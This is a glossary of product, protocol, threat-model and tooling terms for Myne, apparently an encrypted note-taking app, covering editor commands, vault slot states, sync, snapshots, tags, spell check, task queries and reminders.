The keystroke-driven menu of insertable elements in the Phase 1 editor, triggered by typing `/` (suppressed inside fenced code block ranges, inline link URL portions, and wikilink ranges so `/` remains content in those contexts). The menu is a fuzzy-match floating list — type `/h1`, `/h`, or `/heading 1` to surface H1; Enter applies, Esc dismisses. `editor-mvp-baseline` ships 11 commands: `/h1`-`/h6`, `/quote`, `/divider`, `/link`, `/bullet`, `/numbered`, `/todo`. **`/wiki` is explicitly excluded** from the baseline set — it ships in `editor-mvp-wikilinks` alongside the autocomplete picker, because the menu should only surface element kinds the editor authoring layer can actually deliver. `/table`, `/code`, `/footnote`, `/callout`, and the date/time inserts `/date` `/day` `/time` `/now` (MYND-338, frozen local-time plain text) ship in their owning sub-feature PRDs.

Used in: `agent-tooling/features/editor-mvp-baseline/prd.md`, `agent-tooling/sessions/grill/2026-05-16-mynd-36-editor-inner-scope.md` Q2

### **sidebar batch refresh** &nbsp; 📦 *Product*

The Notes sidebar's hybrid refresh strategy pinned in `decisions.md` 2026-05-15: **initial-boot chunked Promise.all** (on Editor mount, call `note_list` → split returned IDs into ≤100-ID chunks per `note_titles_batch`'s `BatchTooLarge` cap → fire all chunks via `Promise.all` → populate the `Map<NoteId, TitleRecord>` cache) **plus action-driven surgical `refreshOne(id)`** (after every successful `saveNote / renameNote / createNote / deleteNote`, call `note_titles_batch([id])` for that single ID and update the matching cache entry). The pattern is event-driven, not poll-based — no periodic background re-fetch, no broadcast-channel listener. Backend events (Tauri `emit("note_updated", ...)`) were explicitly rejected for Phase 1 as premature complexity in a single-window scenario; a future multi-window Myne adopts them by replacing `refreshOne` call sites with event handlers (same function, different trigger). Pairs with `optimistic UI rollback` for instant-feedback paths.

Used in: `decisions.md` 2026-05-15; MYND-82

### **single-tab lock** &nbsp; 📦 *Product*

The web client's guarantee that **exactly one browser tab may hold a vault open**. Two tabs on one [OPFS](#opfs-origin-private-file-system) container would race and corrupt it — OPFS has no cross-context write coordination, and both the [double-buffered blob](#double-buffered-blob) writes and the per-note write-new-then-remove-old sequence assume a single writer. The second tab therefore **reports** rather than takes over; taking over would convert "two writers" into "one writer whose files vanished". The primitive is the **Web Locks API** (`web/src/vault-lock.ts`), chosen over a ServiceWorker + BroadcastChannel protocol because a Web Lock is released automatically when its holding context goes away — tab closed, crashed, or killed — so there is no heartbeat, no timeout, and no window in which a dead tab still looks alive. The module deliberately does not decide *when* to acquire: the caller acquires before the vault is opened and releases on lock/close, which is what makes "the second tab never writes" a property of call order rather than a check inside each write. Web-specific, so it is one of the behaviours the thin `e2e-web/` lane owns.

Used in: `decisions.md` 2026-07-26 (web E2E policy); `docs/dev/e2e.md`; `web/src/vault-lock.ts`

### **size class** &nbsp; 📦 *Product*

The mobile client's layout axis — the discriminator that decides which pane composition the wired app renders, **derived from window geometry, never from device brand**: `compact` (the phone's full-screen list ⇄ editor swap), `medium` (≥700px: list + detail two-pane), `expanded` (≥1000px: the WS-01 three-pane — sidebar 248 / list 316 / editor). Two inputs: the **window width** (`window.innerWidth`, so an iPad Split View pane narrowed to phone width falls back to the phone layout, and the Playwright flow tier drives every layout purely by viewport) and a **phone guard** on `window.screen`'s smaller dimension (< 480px → always `compact`; reading `screen` rather than window height keeps the Android IME — which shrinks the layout viewport — from flipping the layout and remounting the editor mid-typing). Orthogonal to [platform](#platform) (`PlatformContext` keeps owning biometric copy / brand concerns; `SizeClassContext` owns layout). Breakpoint budget mirrors the desktop `layoutClamp.ts` discipline (editor pane ≥ 360px, the desktop `CENTER_MIN_WIDTH`).

Used in: `decisions.md` 2026-07-12 "Mobile tablet strategy"; `mobile/src/formfactor/SizeClassContext.tsx`

### **skip (a recurring task)** &nbsp; 📦 *Product*

Advancing a recurring [line-task](#line-task) to its next occurrence **without recording a completion** — "this occurrence did not happen and will not". Same date arithmetic as completing it, with two differences: no `done` field is written, and the existing line is updated **in place** rather than a second line being added, so the line count does not grow.

**A skip leaves no trace at all** — not a ticked marker (which would be a lie), and not a record of the skip (which would be per-occurrence history, rejected outright for the task epic: a task lives in its line and nowhere else). The only evidence a skip happened is that the date moved. In completion-anchored mode a skip counts from today, since there is no completion to anchor on.

Used in: `spec/markdown-dialect.md` §3.8.7; `decisions.md` 2026-07-28

### **unrecognized rule** &nbsp; 📦 *Product*

A `repeat` value outside the closed [recurrence rule](#recurrence-rule) vocabulary — an RFC-5545 expression pasted in, a phrase from another app, a half-typed rule.

Its bytes are **preserved verbatim** and its state is **shown**: the editor renders it as raw source text with a subtle failure hint naming the consequence — this task will not repeat — rather than as a [recurrence chip](#recurrence-chip). What is forbidden is the silent path: falling back to a default rule (which repeats a task the user never asked to repeat) or quietly treating the task as non-recurring (a data-loss-shaped surprise in which the user believes it repeats, completes it, and finds out months later that nothing was scheduled). A rule Myne cannot read must *look* unread.

Used in: `spec/markdown-dialect.md` §3.8.7; `decisions.md` 2026-07-28

### **Slot** &nbsp; 📦 *Product*

The four-state enum that holds a vault's auth state inside `VaultRuntimeState`'s `RwLock<HashMap<VaultId, Slot>>` — one entry per vault, keyed by [VaultId](#vaultid) (an absent key IS the `Empty` case; no `Empty` entries are stored). Variants: `Slot::Empty` (no vault open), `Slot::Recovering { ... }` (post-recovery / pre-password-commit), `Slot::Unlocked(UnlockedVault)` (full editor access), `Slot::ImportSource { ... }` (a second vault opened read-only as the source of a [vault import](#vault-import), myne-md/myne#464). Editor commands match only `Slot::Unlocked(uv) => ...`; the other three variants are structurally rejected at compile time (per entry). The shape is the type-system realization of `recovery-flow.md` §4.1 + §4.3's "no soft-unlocked session" guarantee — security lives in the type, not in UI discipline. Multi-vault made the storage a `HashMap<VaultId, Slot>` (the singleton→map type-swap landed 2026-06-09) under the **≤1-`Unlocked` invariant**: at most one entry is ever `Unlocked` — the **active vault** is that sole `Unlocked` entry (no separate pointer), and unlocking a second vault first locks the current one. An `ImportSource` entry does not count against it and never promotes into it: a second vault's keys can be resident, and they still cannot open an editor. `auth_permits` stays a single global capacity-1 semaphore (one Argon2id auth op in flight client-wide, never per-vault). The per-entry lifecycle reasoning carries forward unchanged.

Used in: `decisions.md` 2026-05-02 "Slot state machine + auth_permits generalization", 2026-06-09 "Runtime multi-slot core", 2026-08-30 "A vault opened for READING is a slot, not an unlock"

### **SlotKind** &nbsp; 📋 *Protocol*

The discriminator for the [`Slot`] enum, exposed across the IPC boundary by the `vault_slot_kind` command (**not** by [vault_status](#vault_status), which probes `vault.meta` on disk). Four variants: `Empty | Recovering | Unlocked | ImportSource`. Serde-Serialize encoding is the bare variant name (no `#[serde(tag)]` wrapper), so the JSON payload on the wire is one of four bare strings — `"Empty"`, `"Recovering"`, `"Unlocked"`, `"ImportSource"`. `ImportSource` is reachable only when the caller passes an explicit `VaultId`, which the import picker does; the active-vault probe resolves an `Unlocked` entry else a `Recovering` one and deliberately never sees an import source. The TypeScript hand-mirror at `src/types/slot-kind.ts` is therefore a string-literal union, not an object discriminator. Used by frontend boot-time and post-WebView-reload routing — never on the post-recovery happy path (the in-process `Slot::Recovering` → `Slot::Unlocked` transition uses the IPC `Ok(())` from `vault_complete_recovery` as the success signal; a defensive `vault_slot_kind` round-trip would be paranoia).

Used in: `decisions.md` 2026-05-02 "Slot state machine + auth_permits generalization"

### **smart-home** &nbsp; 📦 *Product*

What `Cmd+←` and `Cmd+Shift+←` do on a [line-task](#line-task) or any other list row: the first press stops at the item's **content start**, past the marker, and a second press reaches the raw line start (myne-md/myne#561). On `- [x] buy milk` the line the user sees begins at `buy`, because `- [x] ` is decoration-hidden and drawn as a checkbox, so a boundary at the raw offset would select or delete markup that is not on screen.

Progressive by design, which is why it is a keymap behaviour rather than a selection rewrite: the second press needs to know where the first one landed, and nothing further back in the chain does. `Cmd+Backspace` shares the same boundary, so a first press takes the label and a second takes the marker. Forward is untouched, because the end of a line is the end of a line on every kind of line.

Used in: `editor/src/line-boundary.ts`

### **snapshot** &nbsp; 📦 *Product*

An encrypted previous version of a note, captured automatically as the note is edited so an accidental overwrite or bad edit can be recovered (the MYND-96 file-recovery feature — Myne's answer to Obsidian File Recovery). A snapshot is a **frozen [`.myn`](#myn-file) revision**: the prior note plaintext re-sealed under the note's own `item_key` in the `MY01` envelope (`spec/protocol.md` §9.2) — **no new magic byte, no new subkey role**. Snapshots live in a flat `<vault-root>/snapshots/` directory (§9.1), captured **time-coalesced** (≈ one per note per 5 min of active editing, plus on editor-close / vault-lock), retained for a **bounded window** (default ~7 days) with a safety backstop, and pruned eagerly. On **permanent** delete a note's snapshots are purged, preserving cryptographic erase; soft-[Trash](#trash) (an ordinary update, the note still exists) keeps snapshotting. Distinct from the unrelated `vault.prefs` *replay* sense ("restore prior valid `vault.prefs` snapshots") in `threat-model.md` §7. See also [`.myn` file](#myn-file), [Trash](#trash).

Used in: `spec/protocol.md` §9.1; `threat-model.md` §7; `decisions.md` 2026-06-08

### **soft-retire** &nbsp; 📋 *Protocol*

The Phase 2 sync state a device enters when its cursor falls behind the [tombstone horizon](#tombstone-horizon) (it has been offline / silent too long to participate in the per-device-ack [tombstone](#tombstone-horizon) GC). A soft-retired device is dropped from the "must-ack" set so its absence can't pin tombstones forever; on return it cannot resume incrementally and must run a [full-reconcile](#full-reconcile). Reuses the AS16 device-retirement mechanism (also needed for revocation) rather than inventing new state. Distinct from a hard device revocation (per-device token iptal). Phase 2.

Used in: `spec/sync-protocol.md` §11

### **source half** &nbsp; ⚠️ *Threat*

The half of a security finding that is **what Myne does**: the bytes it writes, the values it adopts, the state it leaves behind. It is observable in this repository, by reading or by execution, and it is the half a source-only pass can close.

The counterpart is the [effect half](#effect-half). A closed source half is a real result and it is not a confirmed finding; `docs/dev/audit-nv-verdicts.md` carries one row per lead with the two halves recorded separately for exactly this reason.

Used in: `docs/dev/audit-nv-verdicts.md`; `design-notes/security/0614-unfixed-security-findings-ship-as-ignored-invariant-tests.md`

### **Source mode** &nbsp; 📦 *Product*

The raw-markdown [view mode](#view-mode) of a note tab (MYND-299): the [decoration layer](#decoration-layer) is emptied, so the editor shows the exact on-disk markdown with no rendering — headings keep their `#`s, links show their brackets, nothing is hidden. Because §6 C1 guarantees the editor buffer is byte-identical to the stored `.myn`, Source mode displays exactly the stored bytes. It is editable (unlike [Reading view](#reading-view)) — the writer's surface for inspecting or hand-editing raw syntax. Reached via the command palette or the bottom-bar [view-mode switcher](#view-mode), **not** a default chord (the secondary live ↔ source toggle is deliberately chord-free; `Mod-Shift-E` is reserved for Edit ⇄ Reading). Contrast live preview (cursor-aware reveal) and [Reading view](#reading-view) (rendered, read-only). See also [view mode](#view-mode), [Reading view](#reading-view).

Used in: `spec/protocol.md` §9.5.2, §9.7; `decisions.md` 2026-06-17 (MYND-299)

### **speech-to-text (ASR/STT)** &nbsp; 📦 *Product*

On-device transcription of an audio attachment into text — Myne runs it entirely on the user's machine via a Whisper model (a **built-in default on desktop**, overridable with a user's own side-loaded file; `decisions.md` 2026-07-19 "Bundle a default transcription model on desktop") through the [Candle](#candle) stack ([local inference](#local-inference)); **no cloud, no telemetry, nothing downloaded at runtime** — and, uniquely among the AI surfaces after 2026-08-09, **no [AI provider](#ai-provider) either**: no [remote AI provider](#remote-ai-provider) accepts audio and a [local model runtime](#local-model-runtime) does not serve speech-to-text, so this one really is on-device unconditionally rather than by default (decrypted audio never leaves the device, A1). Triggered on-demand per [voice note](#voice-note) (never auto-run on import); the machine [transcript](#transcript) is cached in the note's [`MYE1`](#mye1) extracted-text blob for search parity and can be inserted into the note body by an explicit user action. Gated on `ai_enabled` like the rest of the AI surface; the model is small and **fallible**, so copy treats a transcript as a machine guess, not a record, and — because the runtime is in-process, **not** sandboxed (SYNC-6) — never claims key-isolation. See `decisions.md` 2026-07-19; `threat-model.md` §7 "Local AI". (MYND-270)

### **startup open** &nbsp; 📦 *Product*

The user preference, exposed in Settings → **Files**, controlling which file opens when the app launches. Two `vault.prefs` fields carry it (`spec/protocol.md` §9.5.2): **`startup_open`** — a mode of `last` (restore the last [workspace slot](#workspace-slot) layout, the default and pre-feature behaviour), `empty` (open a fresh empty editor), or `specific` — and **`startup_open_note`**, the target note UUID used only in `specific` mode. Crucially, choosing `empty`/`specific` does **not** destroy the saved [workspace-state blob](#workspace-state-blob): the session skips restoring it and suppresses workspace staging, so toggling back to `last` restores the prior layout intact. A deleted/unreadable `startup_open_note` falls back to the empty editor; the pref is never auto-cleared. Non-load-bearing. It is now the **only** startup-resume control: the Privacy panel's "Continue where you left off" toggle — which it semantically overlapped — was a backendless mock and was removed, and the cross-device variant is icebox (`decisions.md` 2026-08-01). See [decisions.md](decisions.md) 2026-06-27 (MYND-462).

Used in: `spec/protocol.md` §9.5.2; `decisions.md` 2026-06-27 (MYND-462)

### **state-level actor** &nbsp; ⚠️ *Threat*

Adversary class A10. Nation-state-class adversary with zero-day capabilities, supply-chain access, hardware-implant capability, and the legal power to compel operator cooperation. Myne's status against A10 is Best-effort: boring, well-vetted primitives plus a published spec, with no claim of defense against zero-days or hardware implants beyond what A2 covers.

Used in: `threat-model.md` §1 (A10)

### **story catalogue** &nbsp; 🛠️ *Tooling*

*(Aliases: design-system workbench. The catalogue grew into a workbench with a navbar, a searchable rail, a collapsible inspector and generated Foundations specimens (myne-md/myne#845); the term of record stays "story catalogue".)*

A dev-only, in-repo catalogue of every component, screen and state in the shared `src/` tree, mounted from the **real** components (myne-md/myne#832). It lives at `stories/` on the `web/` model (its own Vite target, no `package.json`, root scripts) and is served by `pnpm stories` on :1423. One entry per (surface × state) is declared in `stories/src/registry.ts`, so every state is addressable by URL; `scripts/check-story-coverage.mjs` is a ratchet that fails when a component or screen lands without a story, and `scripts/check-stories-isolation.mjs` fails if any app build config or Tauri bundle manifest references `stories/`, so "deployable" cannot become "shipped to users". It is not a shipped surface: it carries no backend, makes no network call, and stands outside every app bundle. See also [story host](#story-host), [fixture](#fixture).

Used in: `decisions.md` 2026-10-05; `stories/README.md`

### **story definition of done** &nbsp; 🛠️ *Tooling*

The nine-item anatomy a [story catalogue](#story-catalogue) entry must answer before it counts as covering a surface: overview, when to use it and when not, anatomy, states and variants, behaviour, content guidance, accessibility, tokens and theming, related surfaces. It is borrowed from the component-anatomy model a mature design system documents, and it doubles as the measurable definition of the surfaces still in coverage debt. Four of the nine have a machine behind them (the surface has a story, the story carries a description and non-empty tags, it mounts, and its declared [accessibility level](#accessibility-level) is enforced); the rest are review questions, named rather than left to taste.

Used in: `stories/src/stories/docs.tsx`; `stories/README.md`

### **story host** &nbsp; 🛠️ *Tooling*

The single module (`stories/src/host/internals.ts`) that installs a fake `window.__TAURI_INTERNALS__` before any app module body runs, so the desktop [platform seam](#platform-seam) (`src/platform/*`) is mounted **unmodified** and every `invoke(cmd, args)` routes to a [fixture](#fixture)'s canned data (myne-md/myne#832). It is the mechanism `mobile/tests/flow-logic/mock-ipc.ts` and the E2E page seat already use, reused rather than reinvented: no app source changes and no second UI codebase to drift. It is the one file under `stories/src` permitted to name the Tauri runtime global, the same reasoned exemption `src/lib/app-window.ts` holds.

Used in: `decisions.md` 2026-10-05; `stories/src/host/internals.ts`

### **stray attachment file** &nbsp; 📋 *Protocol*

An [`MYA1`](#mya1) blob present on disk at `attachments/<attachment-id-hex>` whose id is **absent from the [`vault.attachments`](#vaultattachments) catalog** — a crash remnant from a "clean unused attachments" sweep interrupted between its catalog rewrite and the blob unlinks (the catalog-first ordering deletes the entry first). The unlock-time reconcile unlinks stray files (canonical 64-char lowercase-hex names only), but **never** a cataloged id — including a zero-reference [unused attachment](#unused-attachment) awaiting the user's explicit sweep — and skips entirely if the catalog is present-but-undecodable (no mass-delete on corruption). Distinct from an *unused* attachment, which is cataloged and user-visible. (MYND-171; `decisions.md` 2026-06-13)

### **strict-trailing** &nbsp; 📋 *Protocol*

The rule that a blob's **total** byte length MUST equal the length its declared layout implies, given the length fields in that blob's own header — so a blob longer than its layout rejects the parse instead of having the excess ignored. It covers every [magic-byte](#magic-bytes) family: the envelope families are exactly `header_len + ciphertext_len`, [vault.meta](#vaultmeta) is its fixed length, the backup container states the same equality as its own `file_length` equation, and `vault.head-state` ends where its wire head record ends. A parsing-discipline and cross-implementation-agreement rule, not a confidentiality or integrity claim: the per-family size caps bound the declared `ciphertext_len` rather than the total length, so without it nothing bounds a blob's length from above and two independent ports can disagree on which byte strings are valid blobs.

Used in: `spec/protocol.md` §10.3.1

### **supply-chain compromise** &nbsp; ⚠️ *Threat*

Adversary class A8: a transitive dependency in npm, Cargo, or Go modules ships malicious code. Myne's mitigations are hash-pinned lockfiles, minimal direct-dependency surface, dependency-review at update time, and `cargo-vet`/`cargo-audit` in CI. Status: Best-effort — cannot fully defend against a determined attacker in the dependency graph, but the Tauri/Cargo dependency tree is materially smaller than Electron/npm would be.

Used in: `threat-model.md` §1 (A8), §7

### **sync arc** &nbsp; 📦 *Product* *(retired 2026-08-29; see decisions.md)*

*Retired by myne-md/myne#603. It named one glyph doing two jobs: what the current window owed a note, and whether that note had reached the server. Drawn as a three-quarter ring at 7 to 8px, it did neither legibly, and on the `Editing…` readout it drew both facts as two identical marks a pixel apart. The two facts now have their own names and their own icons, the [save readout](#save-readout) and the [unsynced mark](#unsynced-mark). Preserved for audit trail.*

### **sync cursor** &nbsp; 📋 *Protocol*

The Phase 2 opaque, per-device **monotone position** marking how far a device has pulled. A pull sends the cursor and receives the [per-blob sync-meta](#per-blob-sync-meta) for everything changed since; the cursor then advances. It carries **no wall-clock** (clock/order authority is the [version vector](#version-vector-vv), §4.1 Pin 4) — it is a catch-up bookmark, not a security primitive. Persisted device-locally alongside (but separate from) the [vault head](#vault-head) baseline. Phase 2.

Used in: `spec/sync-protocol.md` §8

### **sync-required entry** &nbsp; 📦 *Product*

The rule that the only way into the web client is an **existing synced account**: there is no local-only vault on this client, and the browser is a window onto a vault that already exists elsewhere. The reason is that conflict resolution is sync-based, so a vault that arrived by any other route would be an orphan fork with nothing to reconcile against. Until 2026-08-15 the rule rested on a second, independent reason as well, that the 24-word [recovery phrase](#recovery-phrase) never crossed into served code, and it no longer does: creation and phrase-based recovery ship on the web client (`decisions.md` 2026-08-15, entry 0514). The rule survives on the first reason alone, and an account created in a browser is registered on a sync server as part of creating it, so it is a synced account from the first moment. A normative clause of the [web capability set](#web-capability-set), and one of the web-specific behaviours the thin `e2e-web/` lane owns.

Used in: `decisions.md` 2026-07-26 (web capability set; web E2E policy); `docs/dev/e2e.md`

### **sync taxonomy** &nbsp; 📋 *Protocol*

The Phase 2 four-class partition of a vault's artefacts by sync disposition: **authoritative-data** (notes, `vault.prefs`, `vault.dictionary`, attachments + `vault.attachments` — SYNC), **identity** (`vault.meta` — SYNC, bespoke merge), **rebuildable-cache** (`vault.search`, `vault.indices`, `vault.embeddings`, `vault.graph` — re-derived locally via the §9.6.4 reconcile or a fresh re-layout, NEVER synced; `vault.embeddings` is additionally model-specific), **device-local** (`vault.workspace`, `vault.quickunlock`, `vault.head-state` — NEVER synced). Governed by the invariant **sync members ⊆ backup members**: sync membership is the authoritative-vs-derivable cut of the `protocol.md` §9.11.3 backup allowlist, not a separate list. One deliberate carve-out: **snapshots** are authoritative and in the backup allowlist yet are *never* synced (syncing per-note snapshot cadence would leak edit timing — A13/AS6; `threat-model.md` §7 is normative, `sync-protocol.md` §9.2). Phase 2.

Used in: `spec/sync-protocol.md` §9

### **tag browser** &nbsp; 📦 *Product*

The modal surface for browsing + filtering notes by tag (tag-system / MYND-46). A palette-style carve-out launched from the command palette (`tags.show`) + a BottomBar affordance: a search field + an All/Any (AND/OR) toggle, the vault's tags as clickable chips (the whole chip toggles selection into the filter), and the matching note list directly below. Filtering goes through the single `by_tag` path (subtree-inclusive, trash-excluded, AND = intersection / OR = union); results are recency-sorted. Read-only over the in-RAM [tag index](#tag-index) — selection state is ephemeral, no new at-rest artefact. Completes MYND-200's blocked interactive surface.

Used in: tag-system (MYND-46), [tag index](#tag-index)

### **tag chip** &nbsp; 📦 *Product*

The editor decoration that renders an inline `#tag` as a styled, clickable pill (tag-system / MYND-45). Purely visual — recognize-only / byte-stable (the underlying bytes are never rewritten, `spec/markdown-dialect.md` §3.7.7); cursor-aware (it reveals the raw text when the caret is inside, so a tag can be typed or edited). Clicking a chip opens the [tag browser](#tag-browser) filtered to that tag. Per SYNC-17 the chip ships ONLY together with the tag browser — never as a standalone editor-polish change (a clickable-looking tag with nowhere to go is a dead affordance). The same pill token styles both the editor chip and the browser's tag rows.

Used in: tag-system (MYND-45), `spec/markdown-dialect.md` §3.7.7

### **tag index** &nbsp; 📦 *Product*

The derived index of a vault's tags — inline `#tags` ∪ frontmatter `tags:` (source-agnostic union) — part of VaultIndices (MYND-31). Tags are folded to a canonical key (`foldSegment` = NFC + Unicode lowercase, the §3.7.8 tag-identity rule) on the TS side; the index stores the exact folded tag and derives a hierarchy by splitting nested `#a/b/c` on `/` (direct + subtree counts). `by_tag` is subtree-inclusive — a parent tag includes its descendants. The Rust index is trash-blind; trashed members are excluded TS-side via the `isTrashed` live-set.

Used in: VaultIndices (MYND-31), `spec/markdown-dialect.md` §3.7

### **tag node** &nbsp; 📦 *Product*

A node in the whole-vault [graph view](#graph-view) standing for a TAG rather than a note (myne-md/myne#727; `decisions/ui/0602`, which reverses the notes-only node taxonomy of `decisions.md` 2026-06-08). Drawn as a coloured hub with a ring, labelled `#<display>`, joined by one edge to each note carrying the tag, so a cluster of notes reads as one group with a name on it. Its id is `tag:<folded-key>`, a form no note UUID can take, which is how every consumer tells a tag node from a note without a second field. A tag node exists **only in the whole-vault view**: the local-graph, tag-filter and orphan views stay notes-only, because a hub has no place in a neighbourhood BFS or in a list of notes with no links. It is created exactly when an enabled [color group](#color-group) rule whose filter is a single bare `hasTag` leaf claims the tag, so it costs no extra index query, and the hub and its notes are painted from one map and cannot drift. A rule that combines a tag with a folder or a `not` colours notes without claiming a hub, because it matches a SUBSET of the tag's notes and a hub for it would connect to notes it does not match. Its radius is a property of its KIND rather than of its degree (a tag's degree is its note count, which would otherwise make a popular tag the largest object on screen). Selecting one filters the graph to that tag. **Not synced, never leaves the device.** A tag node is a projection of the plaintext-derived VaultIndices and holds nothing the vault does not already have encrypted at rest; its POSITION is cached in [`vault.graph`](#vaultgraph) like every other node's, under its `tag:<key>` id, in a blob that is AEAD-sealed, device-local, never synced and never backed up (`decisions/sync/0601`). An earlier revision of this entry said the cache "holds node positions only", which a reader could take to mean no vault-content-derived id is in it (`myne-md/myne#727`). Distinct from a [tag chip](#tag-chip) (an editor decoration) and from the [tag index](#tag-index) (the derived data a tag node is drawn from).

Used in: `decisions/ui/0602`, myne-md/myne#727

### **tag suggestion band** &nbsp; 📦 *Product*

The editor surface [auto-tag](#auto-tag) renders into (MYND-651): a CodeMirror block widget anchored at the frontmatter/body boundary, hosting the suggested tags as chips — solid for a tag the vault already has, dashed `+` for one the model coined. One tap accepts (the tag is written into the note's frontmatter `tags:`, not injected as an inline `#tag`); dismiss drops it from the band. **Absent / zero-length when there is nothing to suggest**, so an idle note is never shifted — the byte-stability and shared-listener discipline are inherited from the [tag chip](#tag-chip) decoration cluster's installer. Inert where no inference engine exists (web, and mobile until MYND-653), so it is never a dead affordance.

Used in: MYND-651, `decisions.md` 2026-07-31

### **Source vault** &nbsp; 📦 *Product*

*(Aliases: import source vault. Myne-divergent: yes — the term only exists because Myne can import from its own format.)*

In a **vault import**, the vault notes are read FROM. A local vault on the same device, never the one currently unlocked, or an externally exported `.myne-backup` file (myne-md/myne#816). Never modified by the import: it is read through a dedicated read-only key slot (`Slot::ImportSource`) that holds its `root_key` and `items_key` for the length of the run and is zeroized when the run ends, when the target vault locks, or when an independent TTL expires. A backup source is read by extracting the container's ciphertext members into a private staging directory and pointing the same slot at that root. Contrast **target vault**.

Used in: `threat-model.md` A6, `spec/markdown-dialect.md` §6

### **Spell check** &nbsp; 📦 *Product*

Myne's offline spell checker (epic MYND-261): a Rust-core engine (the `spellbook`
Hunspell-format speller) flags misspelled words in the editor with a squiggle, and
a correction menu offers suggestions plus add-to-dictionary / ignore. Fully local
— bundled dictionaries, no network, no OS/cloud speller (note content is
AS3-Sensitive). A word is correct if valid in **any** active-language dictionary
(set-union, no per-note language detection) or in the **Personal dictionary**.
v0.1 bundles 23 languages (en-US + 22 verified-loadable, AGPL-compatible dicts);
Turkish is deferred (a spellbook flag-format incompatibility).

Used in: `spec/protocol.md` §9.13; MYND-261…267.

### **Suggestion (spell-check)** &nbsp; 📦 *Product*

A candidate correct spelling the [spell checker](#spell-check) offers for a misspelled word, produced by the `spellbook` speller and surfaced (capped at 5, SYNC-14) in the right-click correction menu. Choosing one applies a surgical, byte-stable range edit that replaces exactly the flagged word; it is a presentation affordance only — never an auto-correct, never mutating the buffer until the user picks one. Distinct from the **Personal dictionary** / **Ignore list** actions in the same menu (which change verdicts, not text).

Used in: MYND-265; `src/editor/spell/correction-menu.ts`.

### **task-query block** &nbsp; 📦 *Product*

A fenced code block with the info string `tasks`, rendered as a **live list** of the tasks matching its query (`spec/markdown-dialect.md` §3.9). The note reads as a document rather than as code, and the list is never stale — it re-runs when the index changes.

Its query is a **closed clause roster**, frozen normatively, with one rule doing all the work: ***a field name may never appear where a value goes.*** `in 3 days` is a parameterized constant and is accepted; `due + 3d` reads a field and operates on it, and is not — once that is representable, so is comparing two fields, and the grammar would need an evaluator. All three of the upstream grammar's function-valued forms are excluded.

Two behaviours are load-bearing rather than incidental. An unreadable clause is **dropped and reported inside the block, permanently** — never a toast, which would nag on every note open or go silent after the first. And a query whose clauses were **all** dropped **refuses** rather than matching everything: see [widen guard](#widen-guard). Rendering is purely visual and never modifies the block's bytes, and a block cannot match itself, because inline parsing never descends into a code node.

Used in: `spec/markdown-dialect.md` §3.9; `decisions.md` 2026-07-28; MYND-617

### **widen guard** &nbsp; 📦 *Product*

The rule that a [task-query block](#task-query-block) whose clauses were **all** unreadable **refuses** rather than collapsing to "match everything".

The failure it prevents is specific and nasty: a misunderstood query that renders the entire vault does not look like an error, it looks like a **correct enormous result**, so the user does not go looking for the mistake. A query with no clauses at all is a different case and is legitimately unfiltered — both produce zero clauses, and an implementation that conflates the two renders the whole vault for a query it misread. Inherited verbatim from the Obsidian importer, which implements the same distinction for the same reason.

Used in: `spec/markdown-dialect.md` §3.9.3; `decisions.md` 2026-07-28

### **query block builder** &nbsp; 📦 *Product*

The slash-command surface that writes a [task-query block](#task-query-block) from choices instead of from memory, showing a live preview of the canonical text it produces.

**It is the reason the roster can be English-only.** Translating the roster would mean one contract and one vector set per shipped language, and a vault that stops being portable between a user's own devices — a query written under one app language would be unreadable under another. The builder removes the need to memorize any keyword; what remains is reading them, which the preview also teaches. Operable by keyboard alone from its first version, since it is the comfortable route to the feature.

Used in: `spec/markdown-dialect.md` §3.9.4; `decisions.md` 2026-07-28; MYND-617

### **task reminder** &nbsp; 📦 *Product*

A nudge at a chosen moment for a [line-task](#line-task) carrying a [`remind`](#remind) field (MYND-618). Delivered in **two layers**: an in-app layer while Myne is open and unlocked, and, on platforms that hold such registrations, an OS **pre-registration** layer so one can fire while Myne is closed. **The second layer ships on no client today** (myne-md/myne#508): the desktop has no OS adapter, and mobile's registration pass has no production caller. Everything below describes it because both are one wiring change away, not because either performs it now.

**Locking does not cancel the registered set**, which is an explicit departure from the rule that every plaintext surface is torn down on every lock path, recorded in `decisions.md` 2026-07-28. The rule protects vault *content*; what the platform holds here is a timestamp and a content-free string. It is also barely a choice: the default auto-lock is five minutes with no off switch, so cancelling on lock would end reminders five minutes after the user stops typing.

Not the same as a due date: a due date is when work is *expected*, a reminder is when the user asked to be *interrupted*. Treating one as the other would notify a user who never asked.

Used in: `threat-model.md` §7; `decisions.md` 2026-07-28; MYND-618

### **registration horizon** &nbsp; 📦 *Product*

How far ahead a device hands pending [task reminders](#task-reminder) to its operating system. Device-local and user-adjustable; Myne's default is seven days, and it is also the longest a client offers.

***A privacy bound before a resource one.*** Pending reminder **times** leave the AEAD envelope and sit in OS-owned plaintext (`threat-model.md` §7), so a shorter horizon exposes less. Its consequence is **stated rather than discovered**: reminders stop if Myne is not opened within the horizon, because registration can only happen inside an unlocked session — so the UI shows the date through which reminders are currently registered.

**It bounds the in-app tier too, which is the only tier that ships today** (myne-md/myne#508). Where no operating system holds the registration, the horizon is the window the *running app* arms timers within: the same set, decided by the same `targetReminders` cutoff, delivered by the app rather than the platform. So it is a delivery bound on a client that holds no OS registration and a privacy bound on one that does, and only the second tier renders the "registered through \<date\>" line. That distinction is why the offered horizons are all **shorter** than the default rather than longer: the privacy reading is the one a user is entitled to act on, and widening the window is a `threat-model.md` §7 change rather than a preference.

Used in: `spec/protocol.md` §9.5.2; `threat-model.md` §7; `decisions.md` 2026-07-28, 2026-08-29

### **reminder registration** &nbsp; 📦 *Product*

One [task reminder](#task-reminder) as the operating system holds it: an **opaque identifier** and a [reminder instant](#reminder-instant), plus a [content-free notification body](#content-free-notification-body) the client owns. Nothing else — no task text, no note identifier, no title (MYND-619).

***The identifier is opaque on purpose, and that is a Myne-divergent choice.*** The client's own key for a reminder names where the task lives, which is the right key for reconciling a set and the wrong thing to hand a platform: a registration is written into the operating system's own persistence — and on Android into a pending intent — where a note identifier would be correlatable metadata outside the AEAD envelope. So what crosses is random bytes minted per registration, and the mapping back to a task is held **in memory only**. The cost is accepted rather than hidden: a new session cannot name the previous one's registrations, so it clears and re-registers them.

**Who holds the set differs by platform**, on the client that will hold one: no shipping build registers with an operating system today (see [task reminder](#task-reminder), myne-md/myne#508), so the set is empty everywhere and what follows describes the shape it takes when a pass fills it. iOS keeps it entirely in OS-owned storage. Android exposes no way to enumerate an app's alarms, so the client also keeps a device-local `{identifier → instant}` record — same content as the OS would hold, different holder, and it is what makes a registration survive the reboot that drops every alarm.

Used in: `threat-model.md` §7; `decisions.md` 2026-07-29; MYND-619

